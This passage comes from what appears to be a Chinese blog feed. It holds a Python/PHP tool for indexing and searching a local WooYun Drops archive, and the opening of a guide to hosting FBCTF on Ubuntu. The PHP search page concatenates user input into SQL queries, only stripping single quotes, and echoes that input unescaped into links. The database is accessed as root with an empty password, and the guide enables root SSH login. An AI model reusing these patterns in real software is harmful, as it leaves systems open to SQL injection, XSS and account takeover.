class="string">&#x27;localhost&#x27;</span>, port=<span class="number">3306</span>, user=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&quot;&quot;</span>, db=<span class="string">&#x27;wooyun&#x27;</span>, charset=<span class="string">&#x27;utf8&#x27;</span>) <span class="comment">#定义数据库链接</span></span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    insert_sql =<span class="string">&quot;&quot;&quot;INSERT INTO drops (title,link) VALUES (&#x27;%s&#x27;,&#x27;%s&#x27;);&quot;&quot;&quot;</span></span><br><span class="line">    cur.execute(insert_sql%(string,url))</span><br><span class="line">    conn.commit()</span><br><span class="line">    <span class="comment">#time.sleep(0.5)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getTitle</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">global</span> titles</span><br><span class="line">    <span class="keyword">for</span> titles <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment">#判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(path + <span class="string">&#x27;\\&#x27;</span> + titles): </span><br><span class="line">            <span class="comment">#打开文件</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(path + <span class="string">&#x27;\\&#x27;</span> + titles, <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> files:</span><br><span class="line">                p1 = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;title&gt;([\s\S]*)&lt;/title&gt;&#x27;</span>) <span class="comment">#将正则表达式编译成 p1 对象</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">for</span> line <span class="keyword">in</span> files:</span><br><span class="line">                        match1 = p1.search(line)<span class="comment">#匹配</span></span><br><span class="line">                        <span class="comment">#print(match1)</span></span><br><span class="line">                        <span class="keyword">if</span> match1:</span><br><span class="line">                            string=match1.group(<span class="number">0</span>)</span><br><span class="line">                            string=string.replace(<span class="string">&#x27;&lt;title&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                            string=string.replace(<span class="string">&#x27; | WooYun知识库&lt;/title&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#标题处理</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        insertDB(string)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + string + <span class="string">&#x27;&lt;-&gt;插入成功&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;[-]&#x27;</span> + string + <span class="string">&#x27;&lt;-&gt;插入失败&#x27;</span>)</span><br><span class="line">                        fo = <span class="built_in">open</span>(<span class="string">&#x27;error.txt&#x27;</span>, <span class="string">&quot;ab+&quot;</span>) <span class="comment">#失败记录</span></span><br><span class="line">                        fo.write((<span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;[-]&#x27;</span> + string + <span class="string">&quot;--------插入失败&quot;</span> + <span class="string">&#x27;\r\n&#x27;</span>).encode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">                        fo.close()</span><br><span class="line">                      </span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    fo = <span class="built_in">open</span>(<span class="string">&#x27;error.txt&#x27;</span>, <span class="string">&quot;ab+&quot;</span>)<span class="comment">#失败记录</span></span><br><span class="line">                    fo.write((<span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;[-]&#x27;</span> + titles + <span class="string">&quot;--------获取失败&quot;</span> + <span class="string">&#x27;\r\n&#x27;</span>).encode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">                    fo.close()</span><br><span class="line">    <span class="keyword">return</span> titles</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getTitle(getFiles(path))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>入完库后做个页面来查询【PS：写的不好 见谅。。】</p><p>dops.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;conn.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        乌云知识库</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">    &lt;meta content=<span class="string">&quot;webkit&quot;</span> name=<span class="string">&quot;renderer&quot;</span>&gt;</span><br><span class="line">    &lt;meta content=<span class="string">&quot;IE=edge,chrome=1&quot;</span> http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span>&gt;</span><br><span class="line">    &lt;meta content=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span> name=<span class="string">&quot;viewport&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;/layui/css/layui.css&quot;</span> media=<span class="string">&quot;all&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">main</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">col</span>-<span class="title">xs6</span> <span class="title">layui</span>-<span class="title">col</span>-<span class="title">md12</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">field</span>-<span class="title">title</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;乌云知识库&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h2</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">WooYun</span> <span class="title">Drops</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">hr</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">bg</span>-<span class="title">blue</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">col</span>-<span class="title">xs6</span> <span class="title">layui</span>-<span class="title">col</span>-<span class="title">md12</span> <span class="title">layui</span>-<span class="title">text</span>-<span class="title">center</span> <span class="title">layui</span>-<span class="title">mt</span>-5 <span class="title">layui</span>-<span class="title">mb</span>-5&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">text</span>-<span class="title">h1</span>&quot;&gt;乌云知识库&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">col</span>-<span class="title">xs6</span> <span class="title">layui</span>-<span class="title">col</span>-<span class="title">md12</span> <span class="title">layui</span>-<span class="title">mt</span>-5&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">form</span>&quot; <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">get</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">form</span>-<span class="title">item</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>: 90%;<span class="title">margin</span>: 0 <span class="title">auto</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">input</span>-<span class="title">inline</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">q</span>&quot; <span class="title">required</span>=&quot;&quot; <span class="title">lay</span>-<span class="title">verify</span>=&quot;<span class="title">required</span>&quot; <span class="title">placeholder</span>=&quot;搜索条件&quot; <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">input</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">btn</span> <span class="title">layui</span>-<span class="title">btn</span>-<span class="title">normal</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;搜索&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">col</span>-<span class="title">xs6</span> <span class="title">layui</span>-<span class="title">col</span>-<span class="title">md12</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;!--检索结果-<span class="title">start</span>--&gt;</span></span><br><span class="line"><span class="class">        &lt;?</span></span><br><span class="line"><span class="class">        <span class="title">if</span>(<span class="title">isset</span>($<span class="title">_GET</span>[&#x27;<span class="title">q</span>&#x27;]))</span>&#123;</span><br><span class="line">        @<span class="variable">$q0</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]:<span class="string">&#x27;SQL注射&#x27;</span>;</span><br><span class="line">        @<span class="variable">$q</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$q0</span>);</span><br><span class="line">        <span class="variable">$qs</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;select * from drops where title like &#x27;%&quot;</span>.@<span class="variable">$q</span>.<span class="string">&quot;%&#x27; or link like &#x27;%&quot;</span>.@<span class="variable">$q</span>.<span class="string">&quot;%&#x27; group by id order by id desc&quot;</span>);</span><br><span class="line">        <span class="variable">$num</span> = <span class="string">&quot;15&quot;</span>; <span class="comment">//每页显示30条</span></span><br><span class="line">        @<span class="variable">$page</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])?<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]):<span class="number">1</span>;</span><br><span class="line">        @<span class="variable">$total</span>=<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$qs</span>); <span class="comment">//查询数据的总数total</span></span><br><span class="line">        @<span class="variable">$pagenum</span>=<span class="title function_ invoke__">ceil</span>(<span class="variable">$total</span>/<span class="variable">$num</span>);</span><br><span class="line">        @<span class="variable">$offset</span>=(<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$num</span>;</span><br><span class="line">        @<span class="variable">$$drops_result2222</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;select * from drops where title like &#x27;%&quot;</span>.@<span class="variable">$q</span>.<span class="string">&quot;%&#x27; or link like &#x27;%&quot;</span>.@<span class="variable">$q</span>.<span class="string">&quot;%&#x27; group by id order by id desc limit &quot;</span>.<span class="variable">$offset</span>.<span class="string">&quot;,15&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$$drops_result2222</span>)&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27; </span></span><br><span class="line"><span class="string">&lt;fieldset class=&quot;layui-elem-field layui-field-title&quot; style=&quot;margin-top: 50px;&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;legend&gt;</span></span><br><span class="line"><span class="string">                    搜索结果</span></span><br><span class="line"><span class="string">                &lt;/legend&gt;</span></span><br><span class="line"><span class="string">            &lt;/fieldset&gt;</span></span><br><span class="line"><span class="string">            &lt;table class=&quot;layui-table&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;colgroup&gt;</span></span><br><span class="line"><span class="string">                    &lt;col&gt;</span></span><br><span class="line"><span class="string">                    &lt;col&gt;</span></span><br><span class="line"><span class="string">                    &lt;col&gt;</span></span><br><span class="line"><span class="string">                &lt;/colgroup&gt;</span></span><br><span class="line"><span class="string">                &lt;thead&gt;</span></span><br><span class="line"><span class="string">                    &lt;tr&gt;</span></span><br><span class="line"><span class="string">                        &lt;th&gt;</span></span><br><span class="line"><span class="string">                            标题</span></span><br><span class="line"><span class="string">                        &lt;/th&gt;</span></span><br><span class="line"><span class="string">                        &lt;th&gt;</span></span><br><span class="line"><span class="string">                            链接</span></span><br><span class="line"><span class="string">                        &lt;/th&gt;</span></span><br><span class="line"><span class="string">                        &lt;th&gt;</span></span><br><span class="line"><span class="string">                            操作</span></span><br><span class="line"><span class="string">                        &lt;/th&gt;</span></span><br><span class="line"><span class="string">                    &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                &lt;/thead&gt;&#x27;</span>;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">&quot;&lt;tbody&gt;&quot;</span>;</span><br><span class="line">                 <span class="keyword">while</span>(@<span class="variable">$row223</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$$drops_result2222</span>))&#123;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">&#x27;&lt;td&gt;&#x27;</span>.<span class="variable">$row223</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&#x27;&lt;/td&gt;&#x27;</span>. PHP_EOL;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;&lt;td&gt;&#x27;</span>.<span class="variable">$row223</span>[<span class="string">&#x27;link&#x27;</span>].<span class="string">&#x27;&lt;/td&gt;&#x27;</span>. PHP_EOL;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&#x27;&lt;td&gt; &lt;a href=&quot;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_ADDR&quot;</span>].<span class="variable">$row223</span>[<span class="string">&#x27;link&#x27;</span>].<span class="string">&#x27;&quot; class=&quot;layui-btn layui-btn-normal&quot;&gt;查看&lt;/a&gt;&lt;/td&gt;&#x27;</span>. PHP_EOL;</span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/tbody&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;div  style=&quot;float:right;padding:10px 30px 0 0&quot;&gt;&#x27;</span>;</span><br><span class="line">                @<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]?<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]:<span class="number">1</span>;<span class="comment">//当前页数，默认是1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$page</span>==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$prepage</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$prepage</span>=<span class="variable">$page</span>-<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$page</span>==<span class="variable">$pagenum</span>)&#123;</span><br><span class="line">        <span class="variable">$nextpage</span>=<span class="variable">$pagenum</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$nextpage</span>=<span class="variable">$page</span>+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt; 共 &#x27;</span>.<span class="variable">$total</span>.<span class="string">&#x27; 条记录&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;，&#x27;</span>.<span class="variable">$pagenum</span>.<span class="string">&#x27; 页 &#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;drops.php?q=&#x27;</span>.<span class="variable">$q</span>.<span class="string">&#x27;&amp;page=1&quot; class=&quot;layui-btn layui-btn-sm&quot;&gt;首页&lt;/a&gt;&#x27;</span>. PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;drops.php?q=&#x27;</span>.<span class="variable">$q</span>.<span class="string">&#x27;&amp;page=&#x27;</span>.<span class="variable">$prepage</span>.<span class="string">&#x27;&quot; class=&quot;layui-btn layui-btn-primary layui-btn-sm&quot;&gt;上一页&lt;/a&gt;&#x27;</span>. PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;drops.php?q=&#x27;</span>.<span class="variable">$q</span>.<span class="string">&#x27;&amp;page=&#x27;</span>.<span class="variable">$nextpage</span>.<span class="string">&#x27;&quot; class=&quot;layui-btn layui-btn-primary layui-btn-sm&quot;&gt;下一页&lt;/a&gt;&#x27;</span>. PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;drops.php?q=&#x27;</span>.<span class="variable">$q</span>.<span class="string">&#x27;&amp;page=&#x27;</span>.<span class="variable">$pagenum</span>.<span class="string">&#x27;&quot; class=&quot;layui-btn layui-btn-danger layui-btn-sm&quot;&gt;末页&lt;/a&gt;&lt;/center&gt;&#x27;</span>. PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;blockquote class=&quot;layui-elem-quote layui-text layui-mt-5&quot;&gt;未检索到相关内容！&lt;/blockquote&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;!---检索结果-end--&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">col</span>-<span class="title">xs6</span> <span class="title">layui</span>-<span class="title">col</span>-<span class="title">md12</span>&quot;<span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">bottom</span>: 100<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">fieldset</span> <span class="title">class</span>=&quot;<span class="title">layui</span>-<span class="title">elem</span>-<span class="title">field</span> <span class="title">layui</span>-<span class="title">field</span>-<span class="title">title</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>: 50<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">legend</span>&gt;</span></span><br><span class="line"><span class="class">                    随机文章</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">legend</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">fieldset</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">            @$<span class="title">drops_random</span> = <span class="title">mysql_query</span>(&quot;<span class="title">SELECT</span> * <span class="title">FROM</span> <span class="title">drops</span> <span class="title">WHERE</span> <span class="title">id</span> &gt;= ((<span class="title">SELECT</span> <span class="title">MAX</span>(<span class="title">id</span>) <span class="title">FROM</span> <span class="title">drops</span>)-(<span class="title">SELECT</span> <span class="title">MIN</span>(<span class="title">id</span>) <span class="title">FROM</span> <span class="title">drops</span>)) * <span class="title">RAND</span>() + (<span class="title">SELECT</span> <span class="title">MIN</span>(<span class="title">id</span>) <span class="title">FROM</span> <span class="title">drops</span>) <span class="title">LIMIT</span> 5&quot;);</span></span><br><span class="line"><span class="class">                        @$<span class="title">drops_random</span> = <span class="title">mysql_query</span>(&quot;<span class="title">SELECT</span> * <span class="title">FROM</span> <span class="title">drops</span> <span class="title">WHERE</span> <span class="title">id</span> &gt;= ((<span class="title">SELECT</span> <span class="title">MAX</span>(<span class="title">id</span>) <span class="title">FROM</span> <span class="title">drops</span>)-(<span class="title">SELECT</span> <span class="title">MIN</span>(<span class="title">id</span>) <span class="title">FROM</span> <span class="title">drops</span>)) * <span class="title">RAND</span>() + (<span class="title">SELECT</span> <span class="title">MIN</span>(<span class="title">id</span>) <span class="title">FROM</span> <span class="title">drops</span>) <span class="title">LIMIT</span> 5&quot;);</span></span><br><span class="line"><span class="class">            <span class="title">if</span> (<span class="title">mysql_num_rows</span>($<span class="title">drops_random</span>)&gt;0) </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27; </span></span><br><span class="line"><span class="string">                    &lt;table class=&quot;layui-table&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;colgroup&gt;</span></span><br><span class="line"><span class="string">                            &lt;col&gt;</span></span><br><span class="line"><span class="string">                            &lt;col&gt;</span></span><br><span class="line"><span class="string">                            &lt;col&gt;</span></span><br><span class="line"><span class="string">                        &lt;/colgroup&gt;</span></span><br><span class="line"><span class="string">                    &lt;thead&gt;</span></span><br><span class="line"><span class="string">                        &lt;tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;th&gt;</span></span><br><span class="line"><span class="string">                                标题</span></span><br><span class="line"><span class="string">                            &lt;/th&gt;</span></span><br><span class="line"><span class="string">                            &lt;th&gt;</span></span><br><span class="line"><span class="string">                                链接</span></span><br><span class="line"><span class="string">                            &lt;/th&gt;</span></span><br><span class="line"><span class="string">                            &lt;th&gt;</span></span><br><span class="line"><span class="string">                                操作</span></span><br><span class="line"><span class="string">                            &lt;/th&gt;</span></span><br><span class="line"><span class="string">                        &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                    &lt;/thead&gt;&#x27;</span>;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;&lt;tbody&gt;&quot;</span>;</span><br><span class="line">                     <span class="keyword">while</span>(@<span class="variable">$row223333</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$drops_random</span>))&#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;&lt;td&gt;&#x27;</span>.<span class="variable">$row223333</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&#x27;&lt;/td&gt;&#x27;</span>. PHP_EOL;</span><br><span class="line">                      <span class="keyword">echo</span> <span class="string">&#x27;&lt;td&gt;&#x27;</span>.<span class="variable">$row223333</span>[<span class="string">&#x27;link&#x27;</span>].<span class="string">&#x27;&lt;/td&gt;&#x27;</span>. PHP_EOL;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;&lt;td&gt; &lt;a href=&quot;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_ADDR&quot;</span>].<span class="variable">$row223333</span>[<span class="string">&#x27;link&#x27;</span>].<span class="string">&#x27;&quot; class=&quot;layui-btn layui-btn-normal&quot;&gt;查看&lt;/a&gt;&lt;/td&gt;&#x27;</span>. PHP_EOL;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/tbody&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">footer</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>: 50<span class="title">px</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">wooyun</span>.<span class="title">org</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">charset</span>=&quot;<span class="title">utf</span>-8&quot; <span class="title">src</span>=&quot;/<span class="title">layui</span>/<span class="title">layui</span>.<span class="title">js</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="文件夹目录如下"><a href="#文件夹目录如下" class="headerlink" title="文件夹目录如下"></a>文件夹目录如下</h1><p><img src="/images/Borq1UA.png" alt="文件夹目录"></p><h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><p><img src="/images/YLvOj5i.png" alt="屏幕截图"></p><h1 id="所需文件"><a href="#所需文件" class="headerlink" title="所需文件"></a>所需文件</h1><p><a href="https://github.com/NS-Sp4ce/wooyun-drops-tools">https://github.com/NS-Sp4ce/wooyun-drops-tools</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>校园网搭建FBCTF平台</title>
      <link href="/p/41ca.html"/>
      <url>/p/41ca.html</url>
      
        <content type="html"><![CDATA[<p>记录下校园网内搭建FBCTF那些坑</p><span id="more"></span><p>测试通过的环境：</p><blockquote><p>全新安装的Ubuntu 16.04</p></blockquote><h1 id="Ubuntu配置"><a href="#Ubuntu配置" class="headerlink" title="Ubuntu配置"></a>Ubuntu配置</h1><h2 id="启用ROOT账户"><a href="#启用ROOT账户" class="headerlink" title="启用ROOT账户"></a>启用ROOT账户</h2><ol><li><p>使用:<code>sudo passwd root</code>设置root的密码</p></li><li><p>使用<code>su root</code>来测试是否可以进入root用户，如果出现#说明已经设置root用户的密码成功</p></li><li><p>进入到<code>/usr/share/lightdm/lightdm.conf.d/</code>目录，使用<code>gedit 50-unity-greeter.conf &amp;</code>命令打开<code>50-unity-greeter.conf</code> 文件</p></li><li><p>文件末尾添加</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user-session=ubuntu</span><br><span class="line">greeter-show-manual-login=true</span><br><span class="line">allow-guest=false</span><br></pre></td></tr></table></figure><ol start="5"><li>保存重启</li><li>此时会出现读取&#x2F;root&#x2F;.profile时发现错误的对话框，点击确定按钮，进入系统，使用<code>vi /root/.profile</code>命令修改文件，找<code>到mesg n</code>，修改为：<code>tty -s &amp;&amp; mesg n</code><br>如下图<br><img src="/images/odNj9tW.png"><blockquote><p>具体参考<a href="https://blog.csdn.net/sunxiaoju/article/details/51993091">https://blog.csdn.net/sunxiaoju/article/details/51993091</a></p></blockquote></li></ol><h1 id="允许ROOT连接SSH"><a href="#允许ROOT连接SSH" class="headerlink" title="允许ROOT连接SSH"></a>允许ROOT连接SSH</h1><ol><li>编辑<code>sudo vi /etc/ssh/sshd_config</code></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Authentication:</span><br><span class="line">LoginGraceTime 120</span><br><span class="line">PermitRootLogin prohibit-password</span><br><span class="line">StrictModes yes</span><br></pre></td></tr></table></figure><p>更改为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Authentication:</span><br><span class="line">LoginGraceTime 120</span><br><span class="line">#PermitRootLogin prohibit-password</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">StrictModes yes</span><br></pre></td></tr></table></figure><ol start="2"><li>重启ssh</li></ol><p><code>sudo service ssh restart</code></p><h1 id="搭建FBCTF"><a href="#搭建FBCTF" class="headerlink" 